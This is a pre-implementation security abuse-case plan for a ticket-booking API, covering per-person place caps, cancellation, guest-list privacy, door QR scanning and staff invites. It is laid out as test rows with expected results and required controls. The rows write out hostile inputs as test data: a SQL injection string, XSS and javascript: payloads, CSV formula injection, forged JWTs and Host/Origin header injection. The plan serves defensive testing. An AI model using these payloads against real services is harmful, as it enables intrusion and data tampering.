# TASK-302 — Abuse cases for Change C (1–5 places per booking) and Change E (guest list without email, web door scanner, staff-invite UI)

Status: written BEFORE implementation, by an identity that will not implement it (rules §2 control 1, §3).
Code read at `e5b24ec` (branch `claude/underground-mvp`): `api/src/{tickets,organizer,staff,routes,events,ratelimit,auth,qr,error,users,gdpr,eventsocial,social,admin}.rs`,
`api/migrations/{0001,0004,0021,0023,0030,0034,0036,0037}`, `api/tests/{tickets_reserve,staff}.rs`, `web/lib/api.ts`,
`web/lib/seo.ts`, `web/app/components/JsonLd.tsx`, `web/app/organizer/[eventId]/page.tsx`, the Android `EventApi.kt` reserve call,
and `docs/briefs/2026-11-11-mvp-bez-oplaty.md`.

Owner decisions this file implements: up to 5 places per person per event, no approval; the organiser sees only the
attendee's name and number of places (no email); the guest cancels and the places return; organiser and invited staff scan.

## Conventions

- `E` = a free (`cost_type='free'`), published, future event, `tickets_total = 30` unless a row says otherwise; organiser `O`.
  `E2` = another free event of organiser `O2`. `U`, `V`, `W` = ordinary users. `S` = a user who accepted a staff invite for `E`.
- `tl` = `events.tickets_left` of the event in the row.
- `holdings(U,E)` = count of `tickets` with `owner_id = U`, `event_id = E`, `status IN ('active','pending_claim','used')`.
  This is what the 5-place cap counts (see "Decisions taken here", D1).
- `INV-1` (free events): `tickets_total = tickets_left + count(tickets of the event with status IN ('active','pending_claim','used'))`.
- "reserve(q)" = `POST /api/events/:id/reserve` with body `{"quantity": q}` and U's Bearer token.
- "cancel-all" = the endpoint Change C adds to cancel all of the caller's places on one event (any route; e.g.
  `DELETE /api/events/:id/reserve`). Per-ticket cancel = existing `POST /api/tickets/:id/return`.
- "guest list" = the organiser endpoint Change E reshapes (today `GET /api/events/:id/tickets`).
- "staff list / revoke" = the endpoints Change E adds so the organiser can see and cut off staff and pending invites.
- "Concurrent" rows release all requests from one barrier and are repeated 50 times; one violation fails the row.
- A verdict names the HTTP status and the DB state that a test asserts. "0 tickets" means no new `tickets` row for that user and event.

## Decisions taken here (each is a verdict a row asserts; flip any of them and the rows change)

- **D1** The cap counts `active`, `pending_claim` and `used`. Counting only `active` lets a user gift 5 tickets out
  (`pending_claim`) and book 5 more, then revoke the gifts: 10 places. Counting `used` keeps "5 places per person per event"
  true after the door. Returned tickets do not count.
- **D2** Absent body, empty body, `{}` and `{"quantity": null}` mean 1 place (the web client sends `Content-Type: application/json`
  with no body; the Android client sends no body and no Content-Type). Any other malformed or out-of-range body is an error,
  never a silent 1.
- **D3** Receiving places (transfer, gift claim) counts toward the recipient's cap: a recipient at 5 gets 409.
- **D4** The organiser may book places on their own event, under the same cap.
- **D5** Staff are scan-only (BR-012): staff get 403 on the guest list. The scan response may carry the scanned holder's name, never email.
- **D6** The staff invite stays a single-use bearer token (not bound to an email); the control against the wrong person
  accepting is the organiser seeing the acceptor's name and revoking.
- **D7** Scanning on a cancelled or admin-blocked event returns `200 {"valid":false,"reason":"event_cancelled"}` and changes
  nothing. Hidden and draft events still scan (the event may still take place).
- **D8** Rate-limit defaults (configurable, the tests use these): reserve 10 calls per user per event per hour, 30 calls per
  user per hour across events, scan 120 calls per user per event per minute.
- **D9** A no-op cancel-all returns `200 {"cancelled":0}` (a double click must not show an error).

## 1. Quantity parsing (Change C)

| ID | Attack (request / sequence) | Verdict and observable result | Control |
|---|---|---|---|
| Q01 | reserve with `{"quantity":0}` | REJECT: 422; 0 tickets; `tl` unchanged | CT1 |
| Q02 | `{"quantity":-1}` | REJECT: 422; 0 tickets; `tl` unchanged | CT1 |
| Q03 | `{"quantity":6}` | REJECT: 422 (not 201 with 5: no clamping; not 409); 0 tickets; `tl` unchanged | CT1 |
| Q04 | `{"quantity":1000}` | REJECT: 422; 0 tickets | CT1 |
| Q05 | `{"quantity":2147483648}`, `{"quantity":18446744073709551616}`; and `{"quantity":1e309}` | REJECT: 422 for the first two, 400 for `1e309`; 0 tickets; no 5xx; `GET /health` answers 200 right after | CT1 |
| Q06 | `{"quantity":2.5}`, `{"quantity":2.0}`, `{"quantity":1e0}` | REJECT: 422 for each (a float is never coerced to an integer); 0 tickets | CT1 |
| Q07 | `{"quantity":"2"}`, `{"quantity":"five"}`, `{"quantity":"5 OR 1=1"}` | REJECT: 422; 0 tickets. In particular NOT 201 with 1 ticket: axum-core 0.4.5 `Option<Json<T>>` turns every rejection into `None`, which would silently book 1 place | CT1 |
| Q08 | `{"quantity":true}`, `{"quantity":[2]}`, `{"quantity":{"$gt":0}}` | REJECT: 422; 0 tickets | CT1 |
| Q09 | `{"quantity":null}` | ALLOW: 201; exactly 1 ticket; `tl` −1 (D2) | CT1 |
| Q10 | `{}` | ALLOW: 201; exactly 1 ticket (D2) | CT1 |
| Q11 | Android shape: POST, no `Content-Type`, empty body | ALLOW: 201; exactly 1 ticket; the response body deserialises into the pre-change `Ticket` DTO (`id`, `event_id`, `qr_token`, `status`, `price`, `created_at`, `event_title`) | CT1, CT16 |
| Q12 | Web shape: `Content-Type: application/json`, `Content-Length: 0` | ALLOW: 201; exactly 1 ticket | CT1, CT16 |
| Q13 | `{"quantity":1,"quantity":5}` and `{"quantity":5,"quantity":1}` | REJECT: 422 for both (no first-wins, no last-wins); 0 tickets | CT1 |
| Q14 | malformed JSON: `{"quantity":` and `{quantity:2}` | REJECT: 400; 0 tickets (a broken body is not "absent") | CT1 |
| Q15 | body bytes not valid UTF-8 (`{"quantity":"\xff"}`) | REJECT: 400; 0 tickets | CT1 |
| Q16 | `{"quantity":2,"owner_id":"<V>","event_id":"<E2>","price":"50","status":"used","tickets_left":999}` | ALLOW, extra fields ignored: 201; exactly 2 tickets with `owner_id = U`, `event_id = E` (path), `price = 0`, `status = 'active'`; V has 0 tickets; E2 unchanged; `tl(E)` −2 | CT1 |
| Q17 | `POST /api/events/E/reserve?quantity=5`, no body | ALLOW: 201 with exactly 1 ticket (the query string is ignored) | CT1 |
| Q18 | body larger than 2 MiB | REJECT: 413; 0 tickets | existing `DefaultBodyLimit` |
| Q19 | `{"quantity":` followed by 10 000 `[`; and a top-level body of 10 000 `[` | REJECT: 422 for both (a typed parse stops at the first `[` where a number is expected; nothing recurses); 0 tickets; `GET /health` answers 200 right after | CT1 |
| Q20 | top-level non-object: `5`, `"5"`, and `[2]` | REJECT: 422 for each; 0 tickets. Note: a serde-derived struct accepts `[2]` as its positional form and would book 2 places, so the object check is explicit | CT1 |
| Q21 | baseline `{"quantity":5}` | ALLOW: 201; 5 rows with 5 distinct `id` and 5 distinct `qr_token`; `tl` −5; `GET /api/tickets/:id/qr` succeeds for each of the 5 and each signed token's `tid` equals its own ticket id | CT2, CT3 |

## 2. Per-person cap (Change C)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| C01 | U: reserve(3), then reserve(3) | REJECT second: 409; `holdings(U,E) = 3`; `tl` after the second call equals `tl` after the first | CT2 |
| C02 | U: reserve(3), reserve(2), reserve(1) | ALLOW, ALLOW, REJECT: 201, 201, 409; `holdings(U,E) = 5` | CT2 |
| C03 | U: two concurrent reserve(3) | exactly one 201 and one 409; `holdings(U,E) = 3`; `tl` = start − 3 | CT2 |
| C04 | U: five concurrent reserve(3) | exactly one 201, four 409; `holdings(U,E) = 3` | CT2 |
| C05 | U: six concurrent reserve(1) | exactly five 201 and one 409; `holdings(U,E) = 5`; `tl` = start − 5 | CT2 |
| C06 | U signs in twice (two distinct JWTs), one concurrent reserve(3) with each | exactly one 201 (the cap is keyed on user id, not on the session) | CT2 |
| C07 | U holds 5, two of them scanned (`used`); reserve(1) | REJECT: 409; 0 new tickets (D1) | CT2 |
| C08 | U holds 3 `active` + 2 `pending_claim` (outstanding gifts); reserve(1) | REJECT: 409 (D1; closes the gift-out-then-rebook bypass) | CT2 |
| C09 | U: reserve(5), return 2 tickets, reserve(2) | ALLOW: 201; `holdings(U,E) = 5` (returned places free the cap) | CT2 |
| C10 | U holds 5 on E; reserve(5) on E2 | ALLOW: 201 (the cap is per event) | CT2 |
| C11 | U holds 5 on E, transfers 1 to V (V had 0), then reserve(1) on E | ALLOW: 201; U holds 5, V holds 1 (the cap is per account; see RL06) | CT2, CT4 |
| C12 | U holds 4; concurrent reserve(3) and cancel-all by U | never `holdings(U,E) > 5`; `INV-1` holds after both; each response is 201, 409 or 200 | CT2, CT5 |

## 3. Capacity and the last places (Change C)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| K01 | `tl = 2`; U reserve(3) | REJECT: 409; `tl = 2`; 0 tickets (no partial fill) | CT3 |
| K02 | `tl = 4`; U and V concurrent reserve(3) | exactly one 201 (3 tickets) and one 409; `tl = 1`; tickets of E grew by exactly 3 | CT3 |
| K03 | `tl = 5`; six distinct users concurrent reserve(1) | exactly five 201 and one 409; `tl = 0`; never negative | CT3 |
| K04 | `tickets_total = 0`; reserve(1) | REJECT: 409; `tl = 0` | CT3 |
| K05 | atomicity: the test installs a trigger that raises on the 3rd `tickets` insert for E; reserve(5) | REJECT: 500 with body exactly `{"error":"database error"}`; `tl` unchanged; 0 tickets for U on E (the transaction rolled back as a whole) | CT3 |
| K06 | randomized concurrent mix of at least 200 operations by 10 users on E: reserve(1..5), return, cancel-all, scan, transfer, gift, claim, revoke | after it: `INV-1` holds and `max(holdings(*,E)) <= 5` | CT2–CT5 |
| K07 | O: `PUT /api/events/E` with `{"tickets_left":999,"tickets_total":999}` | ALLOW, fields ignored: 200; `tl` and `tickets_total` unchanged | existing `UpdateEventReq` (no capacity fields) |

## 4. Event state and eligibility (Change C)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| EV01 | reserve(1) on an event the organiser set to `hidden` | REJECT: 404; 0 tickets | existing `status = 'published'` filter |
| EV02 | reserve(1) on an event the admin set to `hidden`; and to `blocked` | REJECT: 404 for both; 0 tickets | existing filter |
| EV03 | reserve(1) on a cancelled event (`DELETE /api/events/:id`) | REJECT: 404; 0 tickets | existing filter |
| EV04 | reserve(1) on a `draft` event | REJECT: 404; 0 tickets | existing filter |
| EV05 | reserve(1) on an event whose `starts_at` is in the past | REJECT: 409; 0 tickets | existing past check |
| EV06 | reserve(1) on an event with `sales_closed = true` | REJECT: 409; 0 tickets | existing check |
| EV07 | `age_rating = '18'`, U has `dob = NULL`; reserve(1) and reserve(5) | REJECT: 409 for both; 0 tickets | existing `meets_age` |
| EV08 | `age_rating = '18'`, U turns 18 tomorrow; reserve(1) | REJECT: 409 | existing `meets_age` |
| EV09 | `age_rating = '18'`, U turns 18 today; reserve(1) | ALLOW: 201 | existing `meets_age` |
| EV10 | reserve(1) on a `cost_type = 'paid'` event | REJECT: 409; 0 tickets | existing check |
| EV11 | O reserves on own E: reserve(6), reserve(5), reserve(1) | 422, then ALLOW 201, then 409 (D4) | CT1, CT2 |
| EV12 | path id: unknown UUID; and `not-a-uuid` | 404; and 400 | existing typed `Path<Uuid>` |
| EV13 | U (adult) reserve(5) on an 18+ event | ALLOW: 201; 5 tickets. The system cannot check the companions' age at booking; the door ID check is the control (see spec_conflicts) | none (stated limit) |
| EV14 | reserve without `Authorization`; with an expired auth JWT; with a JWT signed by another secret; with `alg: none`; with `iat` before `tokens_valid_after`; as an admin-blocked user with an old token | REJECT: 401 for each; 0 tickets | existing `CurrentUser` |
| EV15 | a signed door-QR token sent as `Authorization: Bearer <qr>` | REJECT: 401 (a QR token has no `sub`) | existing claim shapes |

## 5. Cancel (Change C)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| X01 | U returns own `active` ticket | ALLOW: 200; status `returned`; `tl` +1 | existing |
| X02 | U returns a `used` (scanned) ticket | REJECT: 409; status stays `used`; `tl` unchanged | existing |
| X03 | V calls `POST /api/tickets/<U's ticket>/return` | REJECT: 404 (not 403); status unchanged; `tl` unchanged | existing owner filter |
| X04 | U returns a `pending_claim` ticket | REJECT: 409; gift stays `pending` | existing |
| X05 | two concurrent returns of the same ticket by U | exactly one 200 and one 409; `tl` +1 exactly once | existing `FOR UPDATE OF t` |
| X06 | U holds 3 `active`, 1 `used`, 1 `pending_claim` on E; cancel-all | ALLOW: 200 `{"cancelled":3}`; those 3 are `returned`; the `used` one stays `used`; the `pending_claim` one and its gift stay as they were; `tl` +3 | CT5 |
| X07 | cancel-all twice in a row; and two concurrent cancel-all | second sequential call: 200 `{"cancelled":0}`, `tl` unchanged (D9); concurrent: the two `cancelled` values sum to 3 and `tl` grew by exactly 3 | CT5 |
| X08 | U cancel-all on E while V holds tickets on E and U holds tickets on E2 | V's tickets on E and U's tickets on E2 unchanged | CT5 |
| X09 | concurrent cancel-all by U and a scan of one of U's tickets by S | for that ticket exactly one of: (scan `valid:true`, ticket `used`, not counted in `cancelled`) or (ticket `returned`, scan reason `returned`); never both `valid:true` and `returned`; `INV-1` holds | CT5 |
| X10 | cancel-all without `Authorization`; per-ticket return with a non-UUID id | 401; and 400 | existing |
| X11 | U loops reserve(5) / cancel-all on E | the 11th reserve call within one hour: REJECT 429; it creates 0 tickets; `tl` unchanged by it | CT6 |

## 6. Transfer, gift and claim against the cap (Change C)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| T01 | V holds 5 on E; U transfers one E ticket to V's email | REJECT: 409; ticket owner stays U, status `active`; `holdings(V,E) = 5` (D3) | CT4 |
| T02 | V holds 5 on E; U gifts an E ticket to V's email (201); V claims | REJECT the claim: 409; ticket stays `pending_claim`, owner U; gift stays `pending` (U can still revoke) | CT4 |
| T03 | V holds 4 on E; two different gifts to V claimed concurrently | exactly one 200 and one 409; `holdings(V,E) = 5` | CT4 |
| T04 | V holds 4 on E; concurrent V reserve(1) and V claim of a gift | exactly one succeeds; `holdings(V,E) = 5` | CT2, CT4 |
| T05 | U holds 1 `active` + 4 `pending_claim` on E; U revokes one gift | ALLOW: 200; that ticket is `active`; `holdings(U,E)` stays 5; never 500 (today this path can hit the unique index, P8) | CT2 |
| T06 | a gift from U expires; someone tries to claim it | 409 (existing); the ticket returns to U as `active`; `holdings(U,E)` unchanged and never above 5 | CT2 |
| T07 | transfer to self; transfer of a `used` or `returned` ticket | 422; and 404 (existing) | existing |

## 7. Guest list and personal data (Change E)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| G01 | O reads E's guest list | ALLOW: 200; every attendee object has exactly the keys `name`, `places`, `scanned` (top-level totals allowed); no key `email`, `owner_email`, `owner_id`, `user_id`, `dob`, `avatar_url` or a ticket id | CT7, CT15 |
| G02 | every attendee of E registered with an email containing the marker `pii-mk-7f3a`; one attendee GDPR-deleted | no response body or downloaded file contains `pii-mk-7f3a` or `@deleted.invalid`: guest list, CSV export, scan responses (every verdict), `GET /api/me/staff/events`, staff list, invite create and list, and the error bodies of all of these | CT7, CT15 |
| G03 | U's tickets on E: 1 `used`, 2 `active`, 1 `pending_claim`, 1 `returned`; W's tickets on E: only `returned` | U's row: `places = 4`, `scanned = 1`; W has no row | CT7 |
| G04 | two different users, both named `Ivan`, 2 places each | two rows with `places = 2` each, not one row with 4 (grouped by owner id, not by name) | CT7 |
| G05 | O2 (organiser of E2) reads E's guest list | REJECT: 403; the body carries no attendee data | existing owner check |
| G06 | S (staff of E) reads E's guest list | REJECT: 403 (D5) | CT7 |
| G07 | S reads E2's guest list | REJECT: 403 | existing owner check |
| G08 | no `Authorization`; unknown event id | 401; 404 | existing |
| G09 | U signed up by email code and never set a name (the name defaults to the email local part, `pii.localpart.9c1`) | the guest list, the CSV export and the scan response do not contain `pii.localpart.9c1` (needs the owner's choice of fallback; see spec_conflicts) | CT8 |
| G10 | attendee name `<img src=x onerror=window.__xss=1>` | the web guest list and the web scanner show the literal text; `window.__xss` stays `undefined`; no `img` element is created | React escaping; CT14 |
| G11 | CSV export with names `=HYPERLINK("http://x","y")`, `+1`, `-1`, `@SUM(A1)`, a name starting with a tab, `a,b`, `a"b`, and a name containing a newline | every cell that starts with `=`, `+`, `-`, `@`, tab or CR is prefixed with `'`; cells with `,`, `"` or a newline are RFC 4180 quoted; parsing the file gives exactly attendees + 1 rows and 3 columns; header `name,places,scanned` (a localized header is fine); no email column | CT9 |
| G12 | attendee name `'); DROP TABLE tickets;--` | returned literally in the guest list; `tickets` row count unchanged | bound parameters |

## 8. Door scan (Change E reuses `POST /api/events/:id/scan`)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| S01 | replay: S scans U's QR, then the same token again | first 200 `valid:true, reason:"valid"`; second 200 `valid:false, reason:"already_used"`; `validated_at` not changed by the second | existing status check |
| S02 | expired QR: `exp = now − 1 s`; and `exp = now − 30 s` | REJECT both: 200 `valid:false, reason:"not_found"`; ticket stays `active`. Today the −30 s token passes because jsonwebtoken 9.3.1 defaults to a 60 s leeway (P4) | CT10 |
| S03 | a valid QR of an E2 ticket scanned at `/api/events/E/scan` by S | REJECT: 200 `valid:false, reason:"wrong_event"`; E2 ticket stays `active`; `event_title` is empty or E's own title, never E2's; no attendee name | CT11 |
| S04 | forged tokens: signed with another secret; `alg: none`; HS384; `kind:"auth"`; payload `tid` swapped with the signature kept; a login JWT | REJECT each: 200 `valid:false, reason:"not_found"`; no ticket changes | existing `verify_qr` |
| S05 | V (signed in, neither organiser nor staff) scans | REJECT: 403; ticket unchanged | existing `can_scan` |
| S06 | W holds a pending (not accepted) invite and scans | REJECT: 403 | existing `can_scan` |
| S07 | O removes S (staff revoke); S scans | REJECT: 403; `GET /api/me/staff/events` for S no longer lists E | CT12 |
| S08 | U mints a QR, returns the ticket, S scans the QR within its TTL | REJECT: 200 `valid:false, reason:"returned"`; `tl` unchanged by the scan | existing status check |
| S09 | U mints a QR, gifts the ticket (`pending_claim`), S scans the old QR | REJECT: 200 `valid:false, reason:"inactive"` | existing status check |
| S10 | ex-owner QR: U mints a QR, transfers the ticket to V (or V claims U's gift), then S scans U's QR within its TTL | REJECT: 200 `valid:false` (reason `not_found` or a new `stale`); ticket stays `active`; then V's freshly minted QR scans `valid:true` | CT10 |
| S11 | double scan race: the same QR scanned concurrently by two staff devices; and once at `/api/events/E/scan` plus once at `/api/tickets/validate` by O | exactly one `valid:true`; the other `already_used` | existing `FOR UPDATE OF t` |
| S12 | scan without `Authorization` | REJECT: 401 | existing |
| S13 | staff of E2 scans at `/api/events/E/scan` | REJECT: 403 | existing `can_scan` |
| S14 | E cancelled (or blocked by admin); S scans a valid QR of E | REJECT: 200 `valid:false, reason:"event_cancelled"`; ticket stays `active` (D7) | CT11 |
| S15 | the raw `qr_token` (`UG-<uuid>`) sent instead of a signed QR | REJECT: 200 `valid:false, reason:"not_found"` | existing |
| S16 | `qr_token` containing `\u0000`; 10 000 characters; emoji | REJECT: 200 `valid:false, reason:"not_found"`; never 5xx | existing `verify_qr` |
| S17 | scan body larger than 2 MiB | REJECT: 413 | existing `DefaultBodyLimit` |
| S18 | S sends 121 scans within 60 s for E | the 121st: 429; it changes no ticket (D8) | CT6 |
| S19 | key check on a `valid:true` response | keys are a subset of `valid`, `reason`, `event_title`, `name`, `places`, `scanned`; no email (G02) | CT15 |
| S20 | E hidden (by O or admin) or draft; S scans a valid QR | ALLOW: 200 `valid:true` (D7) | existing |

## 9. Staff invites (Change E web UI over `staff.rs`)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| I01 | S accepts O's invite, then accepts the same token again | first 204; second 404; exactly one `event_staff` row for S on E | existing single-use status |
| I02 | W accepts a token S already used | REJECT: 404; no `event_staff` row for W | existing |
| I03 | any account accepts a valid pending token first | ALLOW: 204 (D6); O's staff list then shows that account's name and no email | CT12 |
| I04 | S and W accept the same token concurrently | exactly one 204 and one 404; exactly one new `event_staff` row | existing `FOR UPDATE` |
| I05 | accept an expired token | REJECT: 409; invite status `expired`; no `event_staff` row | existing |
| I06 | O accepts O's own invite | REJECT: 409; no `event_staff` row for O; the invite stays `pending` | CT12 |
| I07 | V, and staff S, call `POST /api/events/E/staff/invite` | REJECT: 403; no new `staff_invites` row | existing owner check |
| I08 | invite for an unknown event; for a cancelled event | 404; REJECT 409 with no new `staff_invites` row | existing; CT12 |
| I09 | 10 000 accepts with random 64-hex tokens; and 1 000 invites created | every accept 404, no `event_staff` row; the 1 000 tokens are distinct and match `^[0-9a-f]{64}$`; no DB column holds a raw token (only its SHA-256) | existing token generation and hashing |
| I10 | V or S reads E's staff list and pending invites | REJECT: 403. O reads them: 200 with name, status and expiry only; no raw token, no `token_hash`, no email | CT12, CT15 |
| I11 | O revokes a pending invite; then someone accepts it | REJECT: 404; no `event_staff` row | CT12 |
| I12 | V or S calls the revoke or remove endpoint | REJECT: 403; rows unchanged | CT12 |
| I13 | invite link leakage | the link the web UI builds puts the token after `#` (`.../staff/accept#<token>`); the access logs of the accept page load (Caddy, Next) contain no token; the token travels only in the `POST /api/staff/accept` JSON body | CT13 |
| I14 | create an invite with `Host: evil.example` and `X-Forwarded-Host: evil.example` | the response contains no `evil.example` (the API returns the token only; the link is built by the client from its configured origin) | existing; CT13 |
| I15 | an admin-blocked S accepts or scans | REJECT: 401 | existing `CurrentUser` |

## 10. Rate limits, multiple accounts and exhaustion

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| RL01 | U makes 11 reserve calls on E within one hour (any outcome) | the 11th: 429; 0 tickets from it; `tl` unchanged by it (D8) | CT6 |
| RL02 | U makes 31 reserve calls across different events within one hour | the 31st: 429 | CT6 |
| RL03 | 20 concurrent reserve calls by U on a fresh bucket with limit 10 | at most 10 responses other than 429 (the limiter is atomic; today it is count-then-insert, P5) | CT6 |
| RL04 | V spends 10 reserve attempts on E; then U's first reserve on E. And: U's two JWTs share one bucket | U gets 201 (no cross-user lockout); the shared bucket hits 429 on the 11th call across both JWTs | CT6 |
| RL05 | scan flood (S18) | as S18 | CT6 |
| RL06 | one person with three accounts (three emails) reserve(5) each on E | ALLOW: three 201, 15 tickets. The cap is per account; the system cannot stop one person with several email addresses; registration throttling belongs to Б6, not to C or E | none (stated limit) |
| RL07 | cancel flood | N/A as a separate limit: a cancel can only undo an earlier reserve, so loops are capped by RL01 (row X11) | CT6 |
| RL08 | after 1 000 rejected reserves (mix of 409, 422, 429) | `pg_stat_activity` shows 0 API sessions `idle in transaction`; the next reserve answers 201 within 1 s | early returns drop the transaction |
| RL09 | U reserve(5) on 31 different events within one hour | the first 30: 201; the 31st: 429; at most 150 places per account per hour | CT6 |

## 11. Web door scanner (Change E, client)

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| W01 | QR that decodes to `javascript:alert(1)`, to `https://evil.example`, and to `<script>...</script>` | the scanner sends the text as `qr_token` and shows the not-found verdict; `location.href` unchanged; no new window; no script runs | CT14 |
| W02 | API answers 401, 403, 429, 500, times out, or the device is offline | the scanner shows an error state and never the admit ("valid") state; only HTTP 200 with `valid === true` shows admit | CT14 |
| W03 | staff leaves the scanner route | every camera `MediaStreamTrack` reaches `readyState === "ended"` within 1 s | CT14 |
| W04 | during a scan | network requests go only to the configured API origin (no third-party QR decoding service) | CT14 |
| W05 | event title or holder name with HTML in the scan result | shown as literal text (as G10) | React escaping |

## 12. Cross-cutting

| ID | Attack | Verdict and observable result | Control |
|---|---|---|---|
| H01 | preflight `OPTIONS /api/events/E/scan` with `Origin: https://evil.example` under the prod config (`CORS_ALLOWED_ORIGINS` set) | no `Access-Control-Allow-Origin: https://evil.example` in the response | existing `cors_layer` allow-list |
| ERR01 | every error from reserve, return, cancel-all, scan, guest list, staff endpoints | body is `{"error": <text>}` from a fixed set; no SQL text, no email, no stack; K05's 500 body is exactly `{"error":"database error"}` | existing `AppError` |

## Attack-class checklist (walked)

| Class | Where covered, or N/A with reason |
|---|---|
| SQL injection | Q07, G12; quantity is a typed integer, ids are `Uuid`, every query binds parameters |
| NoSQL injection | N/A: PostgreSQL only; Q08 rejects an operator object anyway |
| XSS | G10, W01, W05; a live stored XSS outside C and E is P1 |
| Command injection | N/A: no process is spawned anywhere in `api/src` (no `std::process`, no `Command::new`) |
| LDAP injection | N/A: no directory service |
| Template injection | N/A: C and E send no email and render no server template; JSON responses only, React escapes in the web client |
| Auth bypass (missing, expired, forged, replayed tokens; tampered JWT) | EV14, EV15, S02, S04, S10, S12, G08, I15 |
| Authorization escalation, IDOR | X03, X08, G05–G07, S05, S06, S13, I07, I10, I12 |
| Input abuse: oversized | Q18, S17 |
| Input abuse: deep nesting | Q19 |
| Input abuse: boundary values | Q01–Q06, C02, K01, K03, EV08, EV09 |
| Input abuse: null bytes | S16 |
| Input abuse: unicode and undecodable input | Q15, S16, G11 |
| Rate limiting, brute force | X11, S18, RL01–RL09; QR and invite tokens are not guessable (HS256 signature; 244-bit invite token, I09) |
| Header manipulation: host injection | I14 |
| Header manipulation: CORS | H01 |
| Header manipulation: missing security headers | no CSP on the web app (part of P1); C and E add no new header requirement |
| CSRF | N/A: auth is a Bearer header read from `localStorage`, not a cookie, so a cross-site form cannot attach it |
| Path traversal | N/A: no filesystem path is built from input in the touched handlers (uploads untouched) |
| Mass assignment, parameter pollution | Q13, Q16, Q17, K07 |
| Resource leaks | RL08 (transactions, connections), W03 (camera), P13 (`rate_events` growth) |

## Companion pairs (frame-lock check)

| Mechanism | Standard companion | Rows, or why not |
|---|---|---|
| per-call size cap (quantity ≤ 5) | count cap across calls, concurrent calls, other write paths, accounts, events | C01–C02; C03–C06; T01–T06; RL06 (stated limit); C10, RL09 |
| capacity decrement | concurrent write; partial failure | K02, K03; K05 |
| QR time window (TTL) | replay inside the window; window extended by leeway | S01, S10; S02 |
| invite time window (72 h) | replay inside the window | I01, I02, I04 |
| parse `quantity` | re-parse by a second consumer (duplicate keys, query string, clients sending no body) | Q13, Q17, Q11, Q12 |
| read: guest list | second read paths of the same data | CSV G11; scan response S19; staff, invite and error bodies G02. Attendance is also readable through `GET /api/events/:id/social` (`friends_going`) by anyone who follows the attendee: P9, verdict needs the owner (spec_conflicts) |
| encoding to CSV or HTML | hostile and undecodable input | G10, G11, S16, Q15 |
| authorization check (`can_scan`, read outside the transaction) | revocation racing a scan | S07: every scan that starts after the revoke commits gets 403; one scan already in flight may finish (window of one request, accepted) |
| bearer token (invite) | leakage channel; single use | I13, I14; I01, I04 |
| cancel | concurrent scan; double cancel | X09; X05, X07 |
| symlink | hardlink, bind mount, inode | N/A: no filesystem access in the touched code |
| rate limiter | concurrent burst; key choice and cross-user lockout | RL03; RL04 |
| ticket counts | second consumer of counts | `going_count` in `/social` and `tickets_sold` in organiser stats will count places, not people, after C. Not a security property and visible on the page (loud); left to the implementer, no row |

## Controls the implementation must add

1. **CT1 — strict, body-optional quantity extractor.** Read the raw body: empty means 1; otherwise parse strictly into a struct
   with `quantity: Option<u8>` (or `i64` plus a range check) and reject outside 1..=5 with 422. Do not use `Option<Json<_>>`
   (axum-core 0.4.5 turns every rejection into `None`) and do not parse into `serde_json::Value` or a map (duplicate keys).
   Reject a body whose first non-whitespace byte is not `{` (serde-derived structs also accept the array form `[2]`).
   Map errors as axum's `Json` does: serde_json `Category::Syntax` and `Eof` to 400, `Data` to 422.
   Rows: Q01–Q21, EV11.
2. **CT2 — cap under a lock.** Drop `tickets_free_active_owner_event_uniq` (migration 0021) in the same deploy as the new code.
   In one transaction: lock (`SELECT ... FROM events WHERE id = $1 FOR UPDATE`, or `pg_advisory_xact_lock` on event+user),
   count `holdings(U,E)` over `active`, `pending_claim`, `used`, reject with 409 when `holdings + q > 5`. Rows: C01–C12, T04, T05, T06, K06, Q21.
3. **CT3 — all-or-nothing capacity.** One `UPDATE events SET tickets_left = tickets_left - $q WHERE id = $1 AND tickets_left >= $q RETURNING ...`
   plus the q inserts in the same transaction; keep `CHECK (tickets_left >= 0)`; keep `decrement_tickets` at 1 for the paid checkout.
   Rows: K01–K06, Q21.
4. **CT4 — recipient cap on transfer and claim.** `transfer_ticket` and `claim_ticket` take the same lock for the recipient and
   apply the same count; 409 at the cap, nothing changes. Rows: T01–T04, C11.
5. **CT5 — cancel-all.** `UPDATE tickets SET status = 'returned' WHERE owner_id = $u AND event_id = $e AND status = 'active' RETURNING id`,
   then `tickets_left += rows returned`, same transaction; 200 `{"cancelled": n}`. Rows: X06–X09, C12.
6. **CT6 — rate limits.** Buckets `reserve:{user}:{event}` 10 per 3600 s, `reserve:{user}` 30 per 3600 s, `scan:{user}:{event}`
   120 per 60 s, keyed on the user id from the JWT. Make `ratelimit::hit` atomic (for example `pg_advisory_xact_lock(hashtext(bucket))`
   around count and insert in one transaction). Rows: RL01–RL05, RL07, RL09, X11, S18.
7. **CT7 — guest-list query and DTO.** Select only the name and aggregates; group by `owner_id`; places over `active`, `pending_claim`,
   `used`; scanned over `used`; owners with only returned tickets excluded; organiser only (staff 403); no email column in the SQL,
   not only in the DTO. Rows: G01–G08, G12.
8. **CT8 — name fallback** for users who never set a name (owner's choice: ask for a name before the first booking, or show a
   neutral placeholder). Row: G09.
9. **CT9 — CSV writer.** RFC 4180 quoting, formula neutralisation, three columns. Row: G11.
10. **CT10 — QR owner binding and zero leeway.** Add the owner id at mint time to the QR claims and require
    `tickets.owner_id = claim` in both `/api/events/:id/scan` and `/api/tickets/validate`; set `Validation.leeway = 0`. Rows: S02, S10.
11. **CT11 — scan hygiene.** Cancelled or blocked event gives `event_cancelled` and no change; `wrong_event` returns no title or
    name of the other event. Rows: S03, S14.
12. **CT12 — staff management.** Organiser-only list, revoke pending invite, remove staff; reject the organiser accepting their own
    invite; reject an invite on a cancelled event; the list returns names, status and expiry only. Rows: S07, I03, I06, I08, I10–I12.
13. **CT13 — invite link.** Token after `#`; the accept page posts it in the body; the API never builds links from `Host`. Rows: I13, I14.
14. **CT14 — web scanner.** Treat the decoded text as an opaque string; never navigate; admit state only on HTTP 200 with
    `valid === true`; stop the camera tracks on unmount; talk only to the API origin. Rows: W01–W04, G10.
